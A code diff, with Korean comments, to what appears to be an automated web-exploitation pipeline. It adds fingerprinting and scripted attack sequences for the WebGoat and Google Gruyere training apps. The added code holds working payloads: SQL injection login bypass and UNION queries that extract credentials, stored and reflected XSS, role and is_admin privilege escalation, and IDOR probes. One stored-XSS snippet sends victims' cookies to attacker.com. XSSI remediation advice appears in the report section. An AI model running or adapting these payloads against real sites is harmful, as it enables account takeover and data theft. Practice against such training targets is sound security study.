@@ -75,6 +75,7 @@ class PipelineState(TypedDict):
     _attack_url: str
     _attack_method: str
     _attack_data: dict
+    _gruyere_uid: Optional[str]
 
     # SSE emit 콜백 (직렬화 불가 → 런타임 주입)
     _emit_fn: Optional[object]
@@ -571,6 +572,7 @@ async def run_pipeline(
         "_attack_url": "",
         "_attack_method": "",
         "_attack_data": {},
+        "_gruyere_uid": "",
         "_emit_fn": _emit,   # SSE 콜백 주입
     }
 
@@ -601,6 +603,8 @@ async def run_pipeline(
         "is_success": final_state.get("is_success", False),
         "attempts": final_state.get("attempts", 0),
         "target_url": target_url,
+        "target_ip": final_state.get("target_ip", "Unknown"),
+        "detected_tech": final_state.get("detected_tech", "Unknown"),
     })
 
 
@@ -704,6 +708,46 @@ def _auto_login(target_url: str, username: str, password: str) -> dict:
     return {"success": False, "cookie": "", "message": "자동 로그인 지원 안됨 — 수동으로 쿠키를 입력하세요"}
 
 
+def _extract_gruyere_uid(url_or_path: str) -> str:
+    """
+    Gruyere UID는 URL 첫 경로 세그먼트의 긴 숫자 값이다.
+    예: https://google-gruyere.appspot.com/4038.../feed.gtl
+    """
+    try:
+        path = urlparse(url_or_path).path if "://" in (url_or_path or "") else (url_or_path or "")
+        parts = [p for p in path.split("/") if p]
+        if not parts:
+            return ""
+        first = parts[0]
+        if first.isdigit() and len(first) >= 10:
+            return first
+    except Exception:
+        pass
+    return ""
+
+
+def _discover_gruyere_uid(target_url: str, final_url: str, response_text: str, location_header: str = "") -> str:
+    # 1) target/final/location URL 경로에서 직접 추출
+    for candidate in (target_url, final_url, location_header):
+        uid = _extract_gruyere_uid(candidate)
+        if uid:
+            return uid
+
+    # 2) HTML 내 링크에서 추출
+    host = urlparse(target_url).netloc or "google-gruyere.appspot.com"
+    patterns = [
+        rf"https?://{re.escape(host)}/(\d{{10,}})(?:/|[\"'])",
+        r'href=["\']/(\d{10,})(?:/|["\'])',
+        r'src=["\']/(\d{10,})(?:/|["\'])',
+    ]
+    for pat in patterns:
+        m = re.search(pat, response_text or "", re.IGNORECASE)
+        if m:
+            return m.group(1)
+
+    return ""
+
+
 def _recon(state: dict) -> dict:
     url = state["target_url"]
     user_cookie = state.get("_session_cookie", "")
@@ -719,8 +763,56 @@ def _recon(state: dict) -> dict:
         server = res.headers.get("Server", "Unknown")
         x_powered = res.headers.get("X-Powered-By", "")
         body_snippet = res.text[:2000].lower()
+        final_url = str(res.url)  # final URL after redirects
+
+        # ── Gruyere UID extraction (auto-discovery) ──────────────────────
+        gruyere_uid = ""
+        if "gruyere" in url.lower() or "gruyere" in final_url.lower():
+            gruyere_uid = _discover_gruyere_uid(
+                target_url=url,
+                final_url=final_url,
+                response_text=res.text,
+                location_header=res.headers.get("Location", ""),
+            )
+
+            # 루트 URL 입력 시 첫 응답에서 UID가 없을 수 있어 한번 더 보강 조회
+            if not gruyere_uid:
+                try:
+                    parsed = urlparse(url)
+                    gruyere_root = f"{parsed.scheme}://{parsed.netloc}/"
+                    root_res = requests.get(gruyere_root, timeout=5, verify=False, headers=req_headers or None)
+                    gruyere_uid = _discover_gruyere_uid(
+                        target_url=url,
+                        final_url=str(root_res.url),
+                        response_text=root_res.text,
+                        location_header=root_res.headers.get("Location", ""),
+                    )
+                except Exception:
+                    pass
+
+            # /start는 UID로 리다이렉트되는 Gruyere 진입점이라 마지막 폴백으로 사용
+            if not gruyere_uid:
+                try:
+                    parsed = urlparse(url)
+                    start_url = f"{parsed.scheme}://{parsed.netloc}/start"
+                    start_res = requests.get(start_url, timeout=5, verify=False, headers=req_headers or None)
+                    gruyere_uid = _discover_gruyere_uid(
+                        target_url=url,
+                        final_url=str(start_res.url),
+                        response_text=start_res.text,
+                        location_header=start_res.headers.get("Location", ""),
+                    )
+                except Exception:
+                    pass
+
+        # ── URL-based detection (highest priority) ────────────────────────
         tech = "General Web App"
-        if "Apache" in server: tech = "Apache"
+        if "WebGoat" in url or "webgoat" in url.lower():
+            tech = "Java/Spring Boot (WebGoat)"
+        elif "gruyere" in url.lower() or "gruyere" in final_url.lower():
+            tech = "Python (Google Gruyere)"
+        # ── Server header detection ───────────────────────────────────────
+        elif "Apache" in server: tech = "Apache"
         elif "Nginx" in server: tech = "Nginx"
         elif "Express" in server or "Express" in x_powered: tech = "Node.js/Express"
         elif "IIS" in server: tech = "IIS"
@@ -728,11 +820,15 @@ def _recon(state: dict) -> dict:
         elif "HackThisSite" in server or "hackthissite" in server.lower(): tech = "HackThisSite (PHP/Custom)"
         elif "Heroku" in server or "heroku" in server.lower():
             tech = "Node.js/Express (Juice Shop)" if ("juice" in body_snippet or "owasp" in body_snippet) else "Node.js/Express"
+        # ── Body content fallback ─────────────────────────────────────────
         if tech == "General Web App":
             if "juice shop" in body_snippet or "owasp" in body_snippet: tech = "Node.js/Express (Juice Shop)"
             elif "wordpress" in body_snippet or "wp-content" in body_snippet: tech = "WordPress"
             elif "hackthissite" in body_snippet: tech = "HackThisSite (PHP/Custom)"
-        return {"target_ip": ip, "detected_tech": tech, "server": server, "attempts": 0}
+            elif "webgoat" in body_snippet: tech = "Java/Spring Boot (WebGoat)"
+            elif "gruyere" in body_snippet: tech = "Python (Google Gruyere)"
+        return {"target_ip": ip, "detected_tech": tech, "server": server, "attempts": 0,
+                "_gruyere_uid": gruyere_uid}
     except Exception as e:
         return {"target_ip": "Unknown", "detected_tech": "Web Vulnerability",
                 "server": f"Error: {str(e)[:60]}", "attempts": 0}
@@ -748,11 +844,22 @@ def _exploit(state: dict) -> dict:
         kw in payload.lower() for kw in ["/login", "/signin", "/auth", "/user/login"]
     )
 
+    # NOTE: `uid=`는 Gruyere 정상 페이지/링크에도 자주 포함되어 오탐을 유발하므로 제외.
     generic_indicators = [
-        "root:x:0:0:", "uid=", "SQL syntax", "You have an error in your SQL",
+        "root:x:0:0:", "SQL syntax", "You have an error in your SQL",
         "acquisitions", "PackageType",
     ]
-    login_indicators = ["admin@juice-sh.op", "authentication", "role"]
+    # login 응답에서만 의미가 있는 지표들(일반 페이지 오탐 방지)
+    login_indicators = ["admin@juice-sh.op", "authentication", "token"]
+    webgoat_indicators = [
+        "Congratulations", "WEBGOAT_ADMIN", "assignment_solved",
+        "You have successfully completed", '"success":true', '"success": true',
+        "lessonCompleted",
+    ]
+    # Gruyere 전용 시그니처(일반 홈 화면 텍스트는 제외)
+    gruyere_indicators = [
+        "_feed(", "_snippet(", "gruyere.onread(", "while(1);", ")]}',",
+    ]
     ctf_indicators = [
         'type="hidden" name="pass"', "type='hidden' name='pass'",
         'name="pass" type="hidden"', "name='pass' type='hidden'",
@@ -863,6 +970,15 @@ def _exploit(state: dict) -> dict:
                 jwt_token = jwt_match.group()
 
         # ── 성공 판정 ────────────────────────────────────────────────────
+        discovered_gruyere_uid = state.get("_gruyere_uid", "")
+        if not discovered_gruyere_uid and "Gruyere" in state.get("detected_tech", ""):
+            discovered_gruyere_uid = _discover_gruyere_uid(
+                target_url=state.get("target_url", ""),
+                final_url=str(res.url),
+                response_text=res.text,
+                location_header=res.headers.get("Location", ""),
+            )
+
         if is_login_endpoint:
             if req_content_type == "form":
                 has_session = bool(
@@ -878,7 +994,8 @@ def _exploit(state: dict) -> dict:
                     is_json and any(ind.lower() in res.text.lower() for ind in login_indicators)
                 )
         else:
-            is_success = any(ind.lower() in res.text.lower() for ind in generic_indicators + login_indicators + ctf_indicators)
+            # 비로그인 요청에서는 login 지표를 제외해 오탐을 방지
+            is_success = any(ind.lower() in res.text.lower() for ind in generic_indicators + ctf_indicators)
             if not is_success and "robots.txt" in payload and status_code == 200:
                 is_success = any(sensitive in res.text for sensitive in robots_sensitive)
             if not is_success:
@@ -888,6 +1005,19 @@ def _exploit(state: dict) -> dict:
                     is_success = _is_real_file_exposed(res.text, "env", status_code)
                 elif ".bak" in payload or ".backup" in payload:
                     is_success = _is_real_file_exposed(res.text, "bak", status_code)
+            # ── App-specific indicators ───────────────────────────────────
+            _tech = state.get("detected_tech", "")
+            if not is_success and "WebGoat" in _tech:
+                is_success = any(ind in res.text for ind in webgoat_indicators)
+            elif not is_success and "Gruyere" in _tech:
+                payload_l = payload.lower()
+                body_l = res.text.lower()
+
+                # feed/snippets 엔드포인트는 XSSI 노출 여부를 별도로 판정
+                if ("/feed.gtl" in payload_l or "/snippets.gtl" in payload_l) and status_code == 200:
+                    is_success = any(ind.lower() in body_l for ind in gruyere_indicators)
+                else:
+                    is_success = False
 
         # ── CTF 미션 페이지 직접 추출 (HackThisSite Basic Missions) ──────
         ctf_extracted = []
@@ -927,7 +1057,7 @@ def _exploit(state: dict) -> dict:
             if ctf_extracted:
                 is_success = any("[HIDDEN INPUT]" in e or "[JS VAR]" in e or "[JS COMPARE]" in e for e in ctf_extracted)
 
-        all_indicators = generic_indicators + login_indicators + ctf_indicators + robots_sensitive
+        all_indicators = generic_indicators + login_indicators + ctf_indicators + robots_sensitive + webgoat_indicators + gruyere_indicators
         found = [ind for ind in all_indicators if ind.lower() in res.text.lower()] if is_success else []
         found = ctf_extracted + found  # CTF 추출 결과 맨 앞에 표시
         if jwt_token and "token" not in found:
@@ -960,6 +1090,7 @@ def _exploit(state: dict) -> dict:
             "_attack_url": payload,
             "_attack_method": method,
             "_attack_data": post_data,
+            "_gruyere_uid": discovered_gruyere_uid,
         }
     except Exception as e:
         return {
@@ -975,6 +1106,7 @@ def _exploit(state: dict) -> dict:
             "_attack_url": payload,
             "_attack_method": method,
             "_attack_data": post_data,
+            "_gruyere_uid": state.get("_gruyere_uid", ""),
         }
 
 
@@ -983,6 +1115,23 @@ def _detect_attack_type(state: dict) -> str:
     url = state.get("_attack_url", "").lower()
     indicators = " ".join(state.get("_indicators_found", []))
 
+    # ── WebGoat ───────────────────────────────────────────────────────
+    if "webgoat" in url:
+        if "sqlinjection" in url or "sqli" in url:
+            return "sqli"
+        if "crosssitescripting" in url or "xss" in url:
+            return "xss"
+        if "jwt" in url:
+            return "sqli_auth"
+        if "access-control" in url:
+            return "idor"
+        return "generic"
+    # ── Gruyere / XSSI ───────────────────────────────────────────────
+    if "feed.gtl" in url or "snippets.gtl" in url:
+        return "xssi"
+    if "gruyere" in url and ("<script>" in url or "onerror" in url or "alert(" in url):
+        return "xss"
+    # ── Standard types ────────────────────────────────────────────────
     if "/missions/" in url or "[HIDDEN INPUT]" in indicators or "[JS VAR]" in indicators:
         return "ctf"
     if state.get("_jwt_token") or "jwt token captured" in indicators.lower():
@@ -1011,6 +1160,7 @@ def _build_report(state: dict) -> str:
         "ctf":       "Sensitive Data Exposure (CTF Mission)",
         "sqli_auth": "SQL Injection — Auth Bypass",
         "xss":       "Cross-Site Scripting (XSS)",
+        "xssi":      "Cross-Site Script Inclusion (XSSI)",
         "lfi":       "Local File Inclusion (LFI) / Path Traversal",
         "idor":      "Insecure Direct Object Reference (IDOR)",
         "recon":     "Information Disclosure",
@@ -1033,6 +1183,12 @@ def _build_report(state: dict) -> str:
         "xss": (
             "사용자 입력값이 HTML에 그대로 출력되어 스크립트 삽입이 가능합니다. "
             "공격자는 피해자 브라우저에서 임의 코드를 실행하거나 세션 쿠키를 탈취할 수 있습니다."
+        ),
+        "xssi": (
+            "Cross-Site Script Inclusion(XSSI) 취약점이 확인되었습니다. "
+            "feed.gtl 등 JSON 데이터를 JavaScript 함수 호출 형태로 반환하는 엔드포인트가 "
+            "교차 출처 <script> 태그로 포함 가능하여, 공격자 도메인에서 피해자의 인증된 "
+            "데이터(스니펫, 개인정보 등)를 탈취할 수 있습니다."
         ),
         "lfi": (
             "경로 탐색(Path Traversal) 취약점으로 서버 내부 파일 읽기에 성공했습니다. "
@@ -1066,6 +1222,13 @@ def _build_report(state: dict) -> str:
             "입력값 유효성 검사 — 특수문자 필터링",
             "에러 메시지에 SQL 정보 노출 금지",
             "DB 계정 최소 권한 원칙 적용",
+        ],
+        "xssi": [
+            "JSON 응답 앞에 )]}', 또는 while(1); 등 JSON hijacking 방지 prefix 삽입",
+            "동적 데이터를 JavaScript 함수 호출 형태(JSONP)로 반환하지 말 것",
+            "민감 API에 CORS 정책 적용 — 허용된 출처만 접근 가능하도록 설정",
+            "응답 Content-Type을 application/json으로 설정 (text/javascript 금지)",
+            "모든 민감 엔드포인트에 CSRF 토큰 및 인증 검증 추가",
         ],
         "xss": [
             "모든 출력값에 HTML 이스케이핑 적용 (htmlspecialchars 등)",
@@ -1152,6 +1315,87 @@ def _rule_based_payload(state: dict, attempt: int) -> dict:
     parsed = urlparse(state["target_url"])
     base = f"{parsed.scheme}://{parsed.netloc}"
     tech = state.get("detected_tech", "")
+
+    if "WebGoat" in tech:
+        attacks = [
+            {"url": f"{base}/WebGoat/register", "method": "POST", "content_type": "json",
+             "data": {"username": "hacker", "password": "hacker123!", "matchingPassword": "hacker123!", "role": "WEBGOAT_ADMIN"},
+             "explanation": "[1/12] Register with WEBGOAT_ADMIN role — privilege escalation"},
+            {"url": f"{base}/WebGoat/login", "method": "POST", "content_type": "form",
+             "data": {"username": "hacker", "password": "hacker123!"},
+             "explanation": "[2/12] Login with registered credentials"},
+            {"url": f"{base}/WebGoat/SqlInjection/attack5a", "method": "POST", "content_type": "form",
+             "data": {"account": "Smith' OR '1'='1", "operator": "3", "injection": ""},
+             "explanation": "[3/12] SQLi on string field — always-true condition"},
+            {"url": f"{base}/WebGoat/SqlInjection/attack6a", "method": "POST", "content_type": "form",
+             "data": {"account": "Smith", "operator": "3", "injection": "1 OR 1=1"},
+             "explanation": "[4/12] SQLi on numeric field"},
+            {"url": f"{base}/WebGoat/service/lessonmenu.mvc", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[5/12] Lesson menu info disclosure"},
+            {"url": f"{base}/WebGoat/access-control/user-info?account=Tom", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[6/12] IDOR — access Tom's account without auth"},
+            {"url": f"{base}/WebGoat/SqlInjection/attack8", "method": "POST", "content_type": "form",
+             "data": {"name": "Smith' UNION SELECT userid,user_name,password,cookie,1,1,1 FROM user_system_data--"},
+             "explanation": "[7/12] UNION-based SQLi — extract all user credentials"},
+            {"url": f"{base}/WebGoat/CrossSiteScripting/attack5a", "method": "POST", "content_type": "form",
+             "data": {"QTY1": "1", "QTY2": "1", "QTY3": "<script>alert(document.domain)</script>", "QTY4": "1",
+                      "field1": "x", "field2": "<script>alert(document.domain)</script>"},
+             "explanation": "[8/12] Stored XSS via shopping cart field"},
+            {"url": f"{base}/WebGoat/JWT/votings", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[9/12] JWT endpoint — inspect token structure"},
+            {"url": f"{base}/WebGoat/login", "method": "POST", "content_type": "form",
+             "data": {"username": "' OR '1'='1", "password": "x"},
+             "explanation": "[10/12] SQLi auth bypass on login form"},
+            {"url": f"{base}/WebGoat/PathTraversal/profile-upload", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[11/12] Path traversal profile-upload endpoint"},
+            {"url": f"{base}/WebGoat/robots.txt", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[12/12] Recon — robots.txt for hidden paths"},
+        ]
+        return attacks[(attempt - 1) % len(attacks)]
+
+    if "Gruyere" in tech:
+        _uid = state.get("_gruyere_uid", "")
+        if not _uid:
+            _path_parts = [p for p in urlparse(state["target_url"]).path.split("/") if p]
+            _uid = _path_parts[0] if _path_parts else ""
+        if not _uid:
+            return {
+                "url": f"{base}/start",
+                "method": "GET",
+                "content_type": "json",
+                "data": {},
+                "explanation": "[0/12] Discover Gruyere UID via /start redirect",
+            }
+        gb = f"{parsed.scheme}://{parsed.netloc}/{_uid}" if _uid else base
+        attacks = [
+            {"url": f"{gb}/feed.gtl", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[1/12] XSSI — feed.gtl exposes snippets as callable JS"},
+            {"url": f"{gb}/login?user=test&password=test", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[2/12] Login via GET (credentials exposed in URL)"},
+            {"url": f"{gb}/account?action=newaccount&user=hacker&password=hacker123", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[3/12] Create account via GET — no CSRF protection"},
+            {"url": f"{gb}/snippets.gtl?uid=admin", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[4/12] IDOR — access admin's private snippets"},
+            {"url": f"{gb}/addsnippet", "method": "POST", "content_type": "form",
+             "data": {"title": "xss", "snippet": "<img src=x onerror=alert(document.domain)>"},
+             "explanation": "[5/12] Stored XSS via snippet field"},
+            {"url": f"{gb}/feed.gtl?uid=admin", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[6/12] XSSI — steal admin's snippets cross-origin"},
+            {"url": f"{gb}/account?action=update&color=<script>alert(document.domain)</script>", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[7/12] Reflected XSS via profile color field"},
+            {"url": f"{gb}/snippets.gtl?uid=administrator", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[8/12] IDOR — enumerate other user snippets"},
+            {"url": f"{gb}/addsnippet", "method": "POST", "content_type": "form",
+             "data": {"title": "steal", "snippet": "<script>document.location='http://attacker.com/?c='+document.cookie</script>"},
+             "explanation": "[9/12] Stored XSS — cookie theft payload"},
+            {"url": f"{gb}/account?action=newaccount&user=admin2&password=x&is_admin=true", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[10/12] Privilege escalation — add is_admin param"},
+            {"url": f"{gb}/feed.gtl?uid=test", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[11/12] XSSI — enumerate other users' feeds"},
+            {"url": f"{gb}/", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[12/12] Recon — home page user/snippet enumeration"},
+        ]
+        return attacks[(attempt - 1) % len(attacks)]
 
     if "HackThisSite" in tech:
         attacks = [
